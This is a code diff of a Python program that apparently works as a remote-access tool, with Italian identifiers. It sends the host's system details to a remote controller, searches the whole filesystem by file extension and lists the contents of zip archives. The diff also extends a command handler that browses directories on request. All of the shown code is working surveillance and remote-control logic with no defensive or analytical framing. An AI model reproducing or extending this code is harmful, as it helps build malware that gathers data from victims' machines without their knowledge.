@@ -17,8 +17,6 @@ def sendInfo(client):
     while mando == 1:
         try:
             infos = "Operating System: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release() + "\nPath: " + os.getcwd()
-            client.send((str((len(infos)))).encode(FORMAT))
-            time.sleep(2)
             client.send(((infos)).encode(FORMAT))
             time.sleep(4)
             mando = 0
@@ -112,6 +110,22 @@ def filespath(tipologia, client):
             for cartella, sottocartelle, file in os.walk(path):
                 for item in file:
                     if item.endswith(tipologia):
+                        if item.endswith(".zip"):
+                            result.append('"' + item + '"' + " nel percorso: " + cartella)
+                            pathcurrent = os.getcwd()
+                            os.chdir(cartella)
+                            counter_elemets += 1
+                            zf = zipfile.ZipFile(item, 'r')
+                            os.chdir(pathcurrent)
+                            for item2 in zf.namelist():
+                                result.append("\n\t-:" + '"' + item2 + '"')
+
+                            result.append("\n\n")
+
+                        else:
+                            counter_elemets += 1
+                            result.append('"' + item + '"' + " nel percorso: " + cartella + "\n")
+                    elif tipologia[0:2]==".*":
                         if item.endswith(".zip"):
                             result.append('"' + item + '"' + " nel percorso: " + cartella)
                             pathcurrent = os.getcwd()
@@ -364,7 +378,10 @@ def openRemoteControl(client):
                                 lista.append("-: " + item + "\n")
 
                             data = ''.join(lista)
-                            client.send((data).encode(FORMAT))
+                            if len(data)==0:
+                                client.send(("Empty directory").encode(FORMAT))
+                            else:
+                                client.send((data).encode(FORMAT))
                             time.sleep(1.5)
                         else:
                             comandorisolto = comando.split()
@@ -418,7 +435,8 @@ def openRemoteControl(client):
                 client.send((os.getcwd()).encode(FORMAT))
 
             elif comando[0:9] == "filespath":
-                reg = "^filespath( \.[a-z]{1,4})+"
+                #reg = "^filespath( \.[a-z]{1,4})+"
+                reg = "^filespath( (\.[*])|( \.[a-z]{1,4}))+"
                 if(re.match(reg, comando)):
                     try:
                         estensione = comando[10:]
